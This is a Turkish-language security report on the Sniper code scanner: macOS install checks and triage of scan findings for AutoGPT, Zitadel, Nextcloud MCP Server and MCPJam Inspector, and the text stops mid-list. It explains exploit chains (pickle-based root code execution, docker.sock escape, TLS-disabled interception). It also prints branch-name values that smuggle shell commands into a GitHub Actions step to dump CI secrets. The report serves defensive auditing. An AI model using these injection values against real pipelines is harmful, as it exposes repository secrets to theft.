# Gökçe Baran Karakamış — Sniper macOS Kurulum Doğrulaması, Taranan Depolar ve Doğrulanmış Güvenlik Açıkları Raporu

[English](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | **Türkçe** | [日本語](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | [简体中文](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | [한국어](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)

**Yazar / Güvenlik Araştırmacısı:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))

Bu kapsamlı teknik kılavuz ve güvenlik araştırma raporu üç ana bölümden oluşmaktadır:
1. **Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Çalışma Doğrulama Raporu:** Sniper Community'nin gerçek macOS donanımı üzerinde hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu (`community-tools`)** kurulumu ile uçtan uca test ve doğrulama sonuçları.
2. **Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo, Zafiyet Dönüşüm Mekanizmaları ve Günlük Hayat Senaryoları:** **Gökçe Baran Karakamış** tarafından **Sniper** statik analiz (SAST), altyapı (IaC) ve bağımlılık (SCA) denetim motoru ile taranan **8 açık kaynak deponun** kaynak kodu düzeyinde incelenmesi, yanlış pozitif ayrımı, kod hatalarının hangi koşullarda zafiyete dönüştüğünün herkesin anlayabileceği dilde açıklanması, her depo için **3 gerçek hayat senaryosu (`Senaryo A / B / C`)** ve **örnek çalıştırma/doğrulama komutları**.
3. **Bölüm III — Kendi Sniper Taramamızda Bulduğumuz 46 Doğrulanmış Güvenlik Kaydı (`01`..`46`: 45 Özgün Açık + 1 Üst Akış Duplicate), Kod Analizi, Senaryolar ve Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`):** 6 farklı açık kaynak projede (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) keşfedilen ve GitHub Security Advisory (`GHSA`) olarak bildirilen **11 doğrulanmış güvenlik açığının** kodda nasıl oluştuğu, adım adım nasıl zafiyete dönüştüğü, her biri için **3 somut günlük hayat kritik senaryosu (`Senaryo A / B / C`)**, **örnek çalıştırma/tetikleme komutları** ve **savunma yamaları (`git diff`)**.

---

## Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Doğrulama Raporu (2026-10-24)

macOS (Apple Silicon) üzerinde Sniper kurulumu **deneysel değildir**; hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu kurulumu** gerçek macOS donanımı üzerinde test edilmiş, doğrulanmış ve desteklenmektedir:

| Kurulum Yolu | Komut | Gerçek macOS Donanımında Doğrulanan Kapsam | Durum |
| :--- | :--- | :--- | :---: |
| **1. Yerel macOS Kaynak Kurulumu (Native Source Setup)** | `python3 scripts/setup-community --core-only` | `.venv` (CPython 3.12) oluşturma, kilitli çalışma zamanı paketlerinin (`requirements-runtime.lock` + `pip check`) kurulumu, `scripts/sniper-mcp --help`, `scripts/sniper-project-audit --help`, `cli_reports.py --help`, yerel loopback web arayüzü (`127.0.0.1:8787`), yerel SQLite veri dizini başlatma ve örnek proje üzerinde gerçek yerel SAST/veri akışı denetimi (`audit_id: prj_162d09c47587`, `baseline_id: prj_497a1c478d97` — `app.py:4` üzerinde `[critical] Doğrulanmış veri akışı: istek girdisi SQL sorgusuna ulaşıyor (SQL enjeksiyonu)` tespiti ve bildirim kaydı). | **DOĞRULANDI VE DESTEKLENİYOR** |
| **2. macOS Apple Silicon + Docker Desktop Beş Motorlu Kurulum** | `./scripts/deploy-community-tools --accept-third-party-licenses` | SHA-256 özet kilitli 5 yerel motorun (**Nuclei 3.11.1**, **Trivy 0.75.0**, **Gitleaks 8.30.1**, **TruffleHog 3.99.0**, **Opengrep 1.30.1**) çalışma zamanı hazırlık kontrolleri (`precheck_passed`), Türkçe/çok dilli web arayüzü, `./scripts/import-community-project` ile kalıcı proje hacmine (`sniper_projects`) aktarım, 5 motorun tamamında yerel duman testleri ve tam test paketi (**2.826 unittest: 0 hata; 203 pytest geçti; 432 Node testi geçti**). | **DOĞRULANDI VE DESTEKLENİYOR** |

Ayrıntılı İngilizce doğrulama kayıtları için [VALIDATION.md](../VALIDATION.md) ve platform kurulum rehberi için [DEPLOYMENT.md](../DEPLOYMENT.md) belgelerine bakabilirsiniz.

---

## Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo ve Muhtemel Bağlantılı Açıklar

Her depo için bulgular **(A) Doğrulanmış Tehlikeli Primitive / Sertleştirme Açığı**, **(B) Bağlama/Koşula Bağlı Bulgu ve Bağımlılık (SCA) Kayıtları** ve **(C) Kesin Yanlış Pozitif (Yanlış Alarm)** olarak ayrıştırılmış; ardından her depo için:
1. **Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)**,
2. **Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / Senaryo B / Senaryo C`)**,
3. **Örnek Çalıştırma ve Doğrulama Komutları**
ayrıntılı olarak sunulmuştur.

> **Önemli Metodoloji ve Sorumlu Bildirim Notu:** Statik analizde tehlikeli bir fonksiyonun (`exec`, `pickle.loads`, `subprocess.Popen`) veya CI/CD deseninin varlığı tek başına doğrulanmış bir ürün CVE'si anlamına gelmez. Bir bulgunun istismar edilebilir açık sayılması için varsayılan/desteklenen dağıtımda **erişilebilirlik**, **güven sınırı (trust boundary) aşımı** ve **saldırgan önkoşulları** birlikte kanıtlanmalıdır. Doğrulanmış 11 gerçek güvenlik açığı ve çalışma zamanı kanıtları bu belgenin **Bölüm III** kısmında yer almaktadır.

---

## 1. AutoGPT (`autogpt`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `93` bulgu (`2 kritik, 39 yüksek, 34 orta, 16 düşük, 2 bilgi`); toplam `142` triyaj kaydı (`3 likely_false, 139 uncertain`).

### A. Doğrulanmış Sertleştirme ve Yapılandırma Bulguları
1. **Docker Compose Test/Yerel Ortam Dosyalarında Sabit Sırlar (`CWE-798`):**
   * `autogpt_platform/backend/docker-compose.test.yaml:85` (`RABBITMQ_DEFAULT_PASS`), `docker-compose.journeys.yml:22,29` ve `docker-compose.yml:161`.
2. **Konteyner Güvenlik Sertleştirmesi Eksiklikleri (`CWE-250`, `CWE-1104`):**
   * `autogpt_platform/backend/Dockerfile:1`: Ayrıcalıksız `USER` tanımı olmaması (root olarak çalışma) ve `docker-compose.platform.yml:148` / `docker-compose.yml:121` üzerinde `:latest` imaj etiketleri.

### B. Bağlama Bağlı / İkincil Zincir Bulguları
1. **Veritabanından `pickle.loads` ile Zamanlayıcı Durumu Çözme (`CWE-502`):**
   * `autogpt_platform/backend/backend/executor/jobstore_backfill.py:99`: APScheduler'ın `apscheduler_jobs.job_state` sütunundaki ikili (binary) veriyi `pickle.loads(row.job_state)` ile belleğe yükler.
2. **Sözleşme Sapması (OpenAPI vs Kod):**
   * `autogpt_platform/frontend/src/app/api/openapi.json:3589` ve `backend/api/features/chat/share.py:170,186`: Paylaşılan sohbet uç noktaları (`/{share_token}`) kasıtlı olarak halka açıktır (`public_router`), ancak OpenAPI şemasıyla senkronize değildir.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **2 Kritiğin İkisi de Yanlış Pozitif (`obj.execute` SQLi Sanılmış):**
   * `autogpt_platform/backend/backend/api/external/v1/routes.py:131` ve `autogpt_platform/backend/backend/api/features/blocks/routes.py:151` — `obj.execute(data, ...)` SQL sorgusu değil, AutoGPT `Block` sınıfının Python metodudur.
2. **JWT Doğrulama Alarmları (`jwt.get_unverified_header`):**
   * `autogpt_platform/autogpt_libs/autogpt_libs/auth/jwt_utils.py:96`, `backend/integrations/webhooks/step_webhooks/service.py:57` ve `backend/copilot/bot/adapters/teams/auth.py:100` — Üçü de `alg` alanını katı izin listesine (`RS256`) karşı doğrulayıp `jwt.decode()` ile tam imza kontrolü yapıyor.
3. **Sözde "Korumasız Rota" Alarmları:**
   * `codex.py:48,70`, `integrations/router.py:942` ve `orgs/team_routes.py:102,168,224,246` — Hepsinde FastAPI `Security(get_user_id)` veya `Security(get_request_context)` + `_authorize_team_management` yetki kontrolü mevcut.
4. **Sözde Sır ve Günlükleme Alarmları:**
   * `autogpt_platform/backend/backend/copilot/tools/ayrshare_managed.py:44` (`NO_API_KEY` İngilizce açıklama metni), `autogpt_platform/single-container/Dockerfile:29` (`BETTER_AUTH_SECRET=build-only-placeholder-not-used-at-runtime`), `oauth.py:452` ve `token_tracking.py:193` (loglara token değeri değil, harcanan LLM kelime/token sayısı `prompt_tokens` yazılıyor).

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
Python'daki `pickle.loads()` fonksiyonu, kaydedilmiş bir nesneyi geri yüklerken o nesnenin içindeki `__reduce__()` tarifini sorgusuz sualsiz çalıştırır; yani bu fonksiyon veri okumakla kalmaz, verinin içine gizlenmiş işletim sistemi komutlarını da çalıştırabilir. AutoGPT'nin `jobstore_backfill.py:99` dosyasında arka plan görevlerini taşıyan kod şu şekildedir:
```python
# autogpt_platform/backend/backend/executor/jobstore_backfill.py:95-102
for row in rows:
    # apscheduler_jobs tablosundaki ikili (BYTEA) sütunu doğrudan pickle ile çözer
    job_state = pickle.loads(row.job_state)
```
Normal şartlarda dışarıdaki bir web kullanıcısı bu tabloya doğrudan veri yazamaz; bu yüzden tek başına doğrudan bir uzaktan kod çalıştırma (RCE) açığı değildir. **Ancak** sistem yöneticisi `docker-compose.yml` içindeki varsayılan veritabanı/RabbitMQ parolalarını değiştirmeden iç ağa açarsa veya uygulamada başka bir SQL enjeksiyonu / veritabanı sızıntısı yaşanırsa, saldırgan `apscheduler_jobs.job_state` sütununa zararlı bir `pickle` yükü yazar. Arka plan zamanlayıcısı (`executor`) bu satırı okuduğu anda `Dockerfile`'da `USER` kısıtlaması olmadığı için **konteyner içinde doğrudan `root` yetkisiyle** rastgele komut çalıştırır.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — İç Ağda Varsayılan Compose Parolalarıyla Çalışan Kurulumda Veritabanı Üzerinden `root` RCE Zinciri:**
  1. Bir geliştirme ekibi AutoGPT Platformu'nu şirket içi bir sunucuda varsayılan `docker-compose.yml` ayarlarıyla ayağa kaldırır ve PostgreSQL portu iç ağdan erişilebilir kalır.
  2. İç ağdaki yetkisiz bir kullanıcı veya ele geçirilmiş başka bir servis, varsayılan kimlik bilgileriyle veritabanına bağlanıp `apscheduler_jobs` tablosundaki `job_state` alanına `os.system` içeren serileştirilmiş bir Python `pickle` nesnesi yazar.
  3. AutoGPT arka plan işçisi (`jobstore_backfill.py:99`) tabloyu taradığında `pickle.loads(row.job_state)` çalışır ve konteyner `root` kullanıcısıyla çalıştığı için tüm LLM API anahtarları (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`) ele geçirilir.
* **Senaryo B — `:latest` Etiketli Bağımlı Konteyner İmajlarının Tedarik Zinciri Kayması:**
  1. Üretim ortamında `docker-compose.platform.yml` içindeki `:latest` etiketli imajlar kullanılır ve otomatik yeniden başlatma sırasında yeni bir üst imaj çekilir.
  2. Sabit SHA-256 özet (digest) veya sürüm kilidi olmadığı için, beklenmeyen bir kırıcı değişiklik veya bozulmuş üst paket üretime doğrudan yansır.
* **Senaryo C — OpenAPI Şeması ile Gerçek Kod Arasındaki Sözleşme Sapması Nedeniyle Paylaşılan Sohbetlerin Yanlışlıkla İfşası:**
  1. Güvenlik ekibi yalnızca `openapi.json` şemasını inceleyerek tüm sohbet uç noktalarının kimlik doğrulaması gerektirdiğini varsayar ve API ağ geçidini (API Gateway) buna göre yapılandırır.
  2. Oysa `backend/api/features/chat/share.py:170,186` altındaki `/{share_token}` uç noktaları `public_router` üzerinde kayıtlıdır; paylaşım bağlantısını bilen herkes oturum açmadan paylaşılan ajan çıktılarını okuyabilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına Kritiklik:** **Düşük / Orta.** Raporlanan 2 kritik SQLi tamamen yanlış pozitiftir; doğrulanmış bir dış RCE/SQLi açığı yoktur.
* **Birleşiyor mu? (Koşullu Saldırı Hipotezi — Birlikte Kritiklik: ORTA / YÜKSEK [Yalnızca DB Yazma Erişimi Varsa]):** `jobstore_backfill.py:99` içindeki `pickle.loads`, varsayılan compose parolaları ve `root` konteyner ile birleştiğinde veritabanı yazma erişimini tam sistem hakimiyetine dönüştürür.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. AutoGPT deposu üzerinde Sniper tam kapsamlı SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/autogpt" \
  --output-json "$HOME/audit-targets/reports/autogpt-audit.json"

# 2. Yanlış pozitif olan obj.execute çağrıları ile gerçek pickle.loads kullanımını doğrulama
grep -rn "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/"
grep -rn "def execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/data/block.py"

# 3. Sniper CLI üzerinden politika eşiğini aşan bulguları özetleme
python3 cli_reports.py --input "$HOME/audit-targets/reports/autogpt-audit.json" --min-severity medium
```

---

## 2. Zitadel (`zitadel`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `67` bulgu (`8 kritik, 42 yüksek, 5 orta, 11 düşük, 1 bilgi`); toplam `286` triyaj kaydı (`3 likely_true, 283 uncertain`).

### A. Doğrulanmış Sertleştirme ve Örnek Dağıtım Bulguları
1. **Örnek Compose Dosyalarında Docker Soket Bağlama (`docker.sock`):**
   * `deploy/compose/` altındaki üç compose varyantında `/var/run/docker.sock` bağlaması bulunmaktadır (tek bir kök nedenin üç varyantta tekrarı).
2. **Dokümantasyon Ters Vekil Örneğinde `NODE_TLS_REJECT_UNAUTHORIZED=0` ve Başlangıç Yoklaması:**
   * `apps/docs/content/self-hosting/manage/reverseproxy/docker-compose.yaml:154` içinde `NODE_TLS_REJECT_UNAUTHORIZED=0` tanımlıdır (dokümantasyon örneği; `deploy/compose/` dosyalarından ayrıdır).
   * `apps/login/scripts/server.mjs:45`: `pollReady()` yerel başlangıç sağlık kontrolünde `rejectUnauthorized: false` kullanılıyor.

### B. Bağlama Bağlı Bulgular
* **İsteğe Bağlı Şifresiz OpenTelemetry (OTLP) gRPC/HTTP İhracı (`CWE-319`):**
   * `logger.go:94,110`, `metric.go:269,290` ve `tracing.go:214,230`: Yalnızca yönetici yapılandırmada `cfg.Insecure = true` seçerse `WithInsecure()` etkinleşir.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **8 Kritiğin Tamamı Yanlış Pozitif:**
   * `backend/v3/storage/database/dialect/postgres/conn.go:46`, `pool.go:54`, `tx.go:59`: `pgx` veritabanı sürücüsünün parametreli `QueryRow(ctx, sql, args...)` sarmalayıcılarıdır. HTTP log ara katmanındaki `r.Method` değeri genel `Info()`/`Add()` metot isimleri üzerinden yanlışlıkla buraya bağlanmıştır.
   * `cmd/initialise/helper.go:12` ve `cmd/initialise/verify_database.go:79`: Başlangıç veritabanı kurulumundaki `exec(ctx, db, ...)` SQL yardımcı fonksiyonudur; dinamik kod çalıştırma (`eval`/`exec`) değildir.
2. **Yüksek Önemli "SQL Sorgusunda Veri Birleştirme" Alarmları:**
   * `internal/api/grpc/user/query.go:125`, `v2/convert/user.go:169,175,181` ve `intent_test.go:296`: Protobuf arama nesnelerini (`AndQuery`, `OrQuery`, `NotQuery`) iç sorgu yapılarına dönüştüren Go fonksiyonlarıdır; ortada SQL string birleştirme yoktur (`intent_test.go:296`'da ise `authUrl.Scheme+"://"+authUrl.Host` URL birleştirmesi SQL sanılmıştır).
3. **Test Dosyalarındaki Sabit Parola Test Verileri:** `password-complexity.test.tsx`, `validators.test.ts`, `password_test.go` içindeki parola karmaşıklığı birim testi dizgileridir.

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
Zitadel bir kimlik ve erişim yönetimi (IAM / SSO) sunucusudur. Çekirdek Go kodunda veritabanı sorguları parametreli `pgx` sürücüsüyle güvenli biçimde çalışmaktadır. Ancak örnek dağıtım ve dokümantasyon dosyalarında iki ayrı tehlikeli yapılandırma kalıbı yer alır:
1. `deploy/compose/` altındaki örneklerde konteyner içine `/var/run/docker.sock` bağlanması: Linux'ta Docker soketine yazma erişimi olan herhangi bir süreç, konak (host) makinede yeni bir ayrıcalıklı (`--privileged`) konteyner başlatarak konak işletim sisteminin `root` kullanıcısı olabilir.
2. `apps/docs/content/self-hosting/manage/reverseproxy/docker-compose.yaml:154` satırında Node.js tabanlı yeni giriş arayüzü (`zitadel-login`) için `NODE_TLS_REJECT_UNAUTHORIZED=0` verilmesi: Bu ortam değişkeni Node.js'in tüm HTTPS bağlantılarında TLS sertifika doğrulamasını tamamen kapatır.
Eğer bir sistem yöneticisi dokümantasyondaki bu satırı kopyalayıp gerçek üretim ortamında `zitadel-login` ile arka uç Zitadel API'si farklı makinelerdeyken kullanırsa, araya giren (MITM) bir saldırgan sahte sertifikayla OAuth2/OIDC oturum açma trafiğini dinleyebilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Dokümantasyondaki Ters Vekil Örneğini Kopyalayan Operatörün `NODE_TLS_REJECT_UNAUTHORIZED=0` İle Üretime Çıkması:**
  1. Bir DevOps mühendisi Zitadel'i kendi sunucusunda kurarken resmi dokümantasyondaki `reverseproxy/docker-compose.yaml` dosyasını şablon olarak kopyalar ve `NODE_TLS_REJECT_UNAUTHORIZED=0` satırını fark etmeden üretimde bırakır.
  2. `zitadel-login` konteyneri ile arka uç kimlik doğrulama servisi veya dış OIDC sağlayıcıları arasındaki TLS bağlantılarında sertifika kontrolü devre dışı kalır.
  3. Ağ katmanında ARP/DNS zehirlemesi yapabilen bir saldırgan, sahte bir TLS sertifikası sunarak kullanıcıların girdiği parolaları ve oturum jetonlarını düz metin olarak yakalar.
* **Senaryo B — Paylaşımlı Sunucuda `docker.sock` Bağlı Compose Örneğiyle Konteynerden Konağa Kaçış:**
  1. Geliştirme veya küçük ölçekli üretim ortamında `deploy/compose/` altındaki şablon doğrudan çalıştırılır ve `/var/run/docker.sock` konteyner içine bağlanır.
  2. İlgili yardımcı konteynerde meydana gelebilecek herhangi bir ikincil zafiyet veya yanlış yapılandırma sonucunda saldırgan `docker.sock` üzerinden konak makinenin `/etc/shadow` ve tüm diğer konteyner sırlarına `root` olarak erişir.
* **Senaryo C — `cfg.Insecure = true` ile Açılan OpenTelemetry Hattından Hassas İzleme Verisi Sızıntısı:**
  1. Hata ayıklama amacıyla `tracing.go:214` / `logger.go:94` içinde OTLP ihracı `Insecure: true` olarak ayarlanır ve merkezi gözlemlenebilirlik sunucusuna şifresiz gRPC üzerinden gönderilir.
  2. Aynı veri merkezi ağındaki dinleyiciler, kimlik doğrulama akışlarına ait meta verileri ve kullanıcı kimliklerini şifresiz trafikten okuyabilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına Kritiklik:** **Düşük / Orta.** Zitadel çekirdek Go/TypeScript kodunda istismar edilebilir SQLi veya RCE yoktur.
* **Birleşiyor mu?** `docker.sock` bağlaması (`deploy/compose/`) ile `NODE_TLS_REJECT_UNAUTHORIZED=0` (`apps/docs/.../reverseproxy/docker-compose.yaml`) **farklı compose örneklerindedir**; dolayısıyla varsayılan olarak tek bir dosyada birleşmezler. Ancak bir operatör kendi üretim ortamında bu örnekleri birleştirerek kullanırsa risk katlanır.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. Zitadel deposu üzerinde Sniper SAST/IaC denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/zitadel" \
  --output-json "$HOME/audit-targets/reports/zitadel-audit.json"

# 2. Compose dosyalarındaki docker.sock ve NODE_TLS_REJECT_UNAUTHORIZED=0 satırlarını doğrulama
grep -rn "docker.sock" "$HOME/audit-targets/zitadel/deploy/compose/"
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" "$HOME/audit-targets/zitadel/apps/docs/"

# 3. pgx parametreli sorgu sarmalayıcılarını inceleyerek yanlış pozitifleri teyit etme
sed -n '40,65p' "$HOME/audit-targets/zitadel/backend/v3/storage/database/dialect/postgres/conn.go"
```

---

## 3. Nextcloud MCP Server (`nextcloud-mcp-v0.201.0-8064f66`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `59` bulgu (`SAST: 1 kritik, 6 yüksek, 36 orta, 2 düşük` · `IaC: 7 yüksek, 1 bilgi` · `SCA: 5 kritik, 40 yüksek, 30 orta`).

### A. Doğrulanmış Sertleştirme Bulguları
1. **CI/CD `.github/workflows/pact.yml:93` Dal Adı Kabuk İnterpolasyonu (`CWE-78` — Aynı-Repo Sınırlı Sertleştirme):**
   * `.github/workflows/pact.yml:93` satırında `--branch "${{ github.head_ref || github.ref_name }}"` doğrudan `run:` kabuk betiğine yazılmıştır.
   * **Kanıt Denetimi Düzeltmesi:** İş akışı `pull_request_target` **kullanmamaktadır** (tetikleyici `pull_request` ve `push`'tur) ve `satır 35` ile `102`'de `if: ${{ github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository }}` kontrolü bulunduğu için **dış çatal (fork) PR'larda çalışmaz**. Dolayısıyla dış saldırganın fork PR üzerinden sır çalma zinciri yoktur; yalnızca depo içi dal adları için kabuk sertleştirmesi konusudur.

### B. Bağlama Bağlı Bulgular ve SCA Kayıtları
* **Test/Geliştirme Ortamı Sabit Sırları:** `docker-compose.yml` ve `app-hooks/post-installation/15-setup-keycloak-provider.sh` / `scripts/provision-greenmail-account.sh` yerel test/geliştirme ortamı kurulum betikleridir.
* **SCA Bağımlılık Kayıtları (`uv.lock`):** `pillow 11.3.0`, `pyjwt 2.13.0`, `certifi 2026.6.17`, `cryptography 49.0.0`, `fsspec 2026.4.0` kayıtları.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **Login Flow v2 `poll.endpoint` SSRF Alarmı (`login_flow.py:192` — Uçtan Uca Çağrı Zinciriyle Yanlış Pozitif Olduğu Kanıtlandı):**
   * `nextcloud_mcp_server/auth/login_flow.py:173-195` içindeki `poll(self, poll_endpoint: str, poll_token: str)` metodunun tüm depodaki tek çağrıcıları `provision_routes.py:102` (`_poll_and_store`) ve `server/auth_tools.py:304` (`nc_auth_check_status`) fonksiyonlarıdır.
   * Her iki çağrıcı da `poll_endpoint` değerini dış kullanıcı girdisinden değil, `flow_client.initiate()` çıktısından (`login_flow.py:125-151`) alır.
   * `initiate()` metodu ise `login_flow.py:130` satırında **`poll_endpoint = self._rewrite_to_nextcloud_host(raw_poll_endpoint)`** çağrısıyla URL'nin `scheme` ve `netloc` (`host:port`) alanlarını sunucu yapılandırmasındaki sabit `self.nextcloud_host` ile **zorla üzerine yazmaktadır** (`rewrite_url_origin`). Dolayısıyla `poll()` metodunun başka bir sunucuya/iç IP'ye SSRF isteği göndermesi imkansızdır.
2. **JWT İmza Doğrulaması Alarmı (`token_utils.py:178`):** `nextcloud_mcp_server/auth/token_utils.py:178-205` — `jwt.get_unverified_header(id_token)` yalnızca JWKS anahtar kümesinden `kid` seçmek için kullanılmakta, hemen ardından OIDC algoritma izin listesiyle tam imza doğrulaması yapılmaktadır.

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
GitHub Actions iş akışlarında `${{ github.head_ref }}` gibi ifadeler, bash betiği çalışmadan **önce** metin olarak yapıştırılır (macro expansion). `.github/workflows/pact.yml:93` satırında şu ifade yer alır:
```yaml
# .github/workflows/pact.yml:90-95
- name: Publish Pact
  run: |
    pact-broker publish ./pacts \
      --consumer-app-version "${{ github.sha }}" \
      --branch "${{ github.head_ref || github.ref_name }}"
```
Eğer bir dal adı `feat/$(id)` veya `feat";curl ...;#` gibi kabuk özel karakterleri içeriyorsa, bash çift tırnak (`"..."`) içindeki `$(...)` veya `"` karakterlerini komut olarak yorumlar. Şu anki dosyada `github.event.pull_request.head.repo.full_name == github.repository` şartı olduğu için dışarıdan bir GitHub kullanıcısı fork açıp bunu tetikleyemez. **Ancak** ileride bir geliştirici dış PR'lar için Pact testlerini açmak adına bu `if:` koşulunu kaldırırsa veya depo içinde dal açma yetkisi olan kısıtlı bir hesap/bot ele geçirilirse, dal adı üzerinden CI ortamındaki `PACT_BROKER_TOKEN` ve depo sırları çalınabilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Depoya Yazma Yetkisi Olan Kısıtlı Bir Hesabın Dal Adıyla Korumalı CI Sırlarını Sızdırması:**
  1. Organizasyonda yalnızca alt dal (feature branch) açma yetkisi olan ancak `main` dalına veya GitHub Actions Secrets ayarlarına erişimi bulunmayan bir hesap ele geçirilir.
  2. Saldırgan `fix";env|base64;#` adında bir dal gönderdiğinde (`git push`), `pact.yml:93` içindeki kabuk interpolasyonu tetiklenir ve CI çalışma zamanındaki gizli anahtarlar loglara veya dış sunucuya aktarılır.
* **Senaryo B — Yerel Test Ortamı Betiklerindeki (`15-setup-keycloak-provider.sh`) Sabit Sırların Üretim Ortamına Kopyalanması:**
  1. Nextcloud MCP sunucusunu OIDC/Keycloak ile entegre etmek isteyen bir sistem yöneticisi, depodaki `docker-compose.yml` ve `15-setup-keycloak-provider.sh` betiğini değiştirmeden kendi sunucusunda çalıştırır.
  2. Betik içindeki sabit `client_secret` ve yönetici parolaları üretim Keycloak örneğinde aktif kalır; depoyu bilen herhangi bir kişi OAuth istemcisini taklit edebilir.
* **Senaryo C — `uv.lock` İçindeki Güncel Olmayan `pillow` ve `cryptography` Paketlerinin Görsel İşleme Sırasında Tetiklenmesi:**
  1. Nextcloud MCP sunucusu, kullanıcının Nextcloud hesabındaki görselleri ve belgeleri AI ajanına özetlemek için `pillow` kütüphanesiyle işler.
  2. `uv.lock` dosyasındaki eski bağımlılık sürümleri güncellenmeden dağıtıldığında, paylaşılan bir klasöre yüklenen bozuk (malformed) bir görsel dosyası bilinen bellek hatasını tetikleyerek MCP sunucusunu çökertebilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** **Düşük (Sertleştirme).** Hem `pact.yml` dış fork'lara kapalıdır hem de `login_flow.py:192` `initiate()` aşamasında `self.nextcloud_host` origin'ine sabitlendiği için SSRF oluşturmaz. Depoda birleşen veya dışarıdan istismar edilebilen bir SAST açığı yoktur.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. Nextcloud MCP deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66" \
  --output-json "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"

# 2. login_flow.py içinde _rewrite_to_nextcloud_host origin sabitlemesini doğrulama
sed -n '125,195p' "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66/nextcloud_mcp_server/auth/login_flow.py"

# 3. pact.yml içindeki same-repo koşulunu ve kabuk interpolasyonunu inceleme
sed -n '30,105p' "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66/.github/workflows/pact.yml"
```

---

## 4. MCPJam Inspector (`mcpjam-inspector-v3.9.2-eda1fd1`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `122` bulgu (`SAST: 12 kritik, 8 yüksek, 74 orta, 6 düşük` · `IaC: 2 orta, 3 bilgi` · `SCA: 6 kritik, 96 yüksek, 197 orta, 40 düşük`).

### A. Doğrulanmış Sertleştirme Bulguları
1. **CI/CD `.github/workflows/pr-preview.yml:116` Dal Adı Kabuk İnterpolasyonu (`Aynı-Repo Sınırlı`):**
   * `.github/workflows/pr-preview.yml:116` satırında `echo "branch=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"` doğrudan kabuk içinde çalıştırılmaktadır.
   * **Kanıt Denetimi Düzeltmesi:** `pr-preview.yml` içinde `pull_request_target` **yoktur** (tetikleyici `pull_request` ve `repository_dispatch`'tir) ve `satır 65-69`'da `github.event.pull_request.head.repo.full_name == github.repository` ile `dependabot[bot]` dışlaması mevcuttur. Yani dış çatal (fork) PR'lar bu işi tetikleyemez; yalnızca aynı depoda dal açma yetkisi olan kullanıcılar için geçerli bir kabuk sertleştirmesidir.

### B. Bağlama Bağlı Bulgular ve SCA Kayıtları
* **`dependabot-auto-merge.yml:25` (`pull_request_target`):** `.github/workflows/dependabot-auto-merge.yml:15-40` dosyasında `pull_request_target` kullanılmaktadır; ancak dosya içindeki açık güvenlik yorumunda da belirtildiği üzere **hiçbir `actions/checkout` adımı yoktur** ve `if: github.event.pull_request.user.login == 'dependabot[bot]'` ile sınırlandırılmıştır.
* **SCA Bağımlılık Kayıtları (`package-lock.json`):** `handlebars 4.7.9`, `shell-quote 1.10.0`, `tinypool 1.1.1`, `@modelcontextprotocol/sdk` kayıtları.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm — 20 Kritik/Yüksek SAST Bulgusunun 18'i`)
1. **Yorum Satırlarlarındaki `eval (` ve `exec (` Kelimeleri (11 Kritik + 3 Yüksek Yanlış Alarm):**
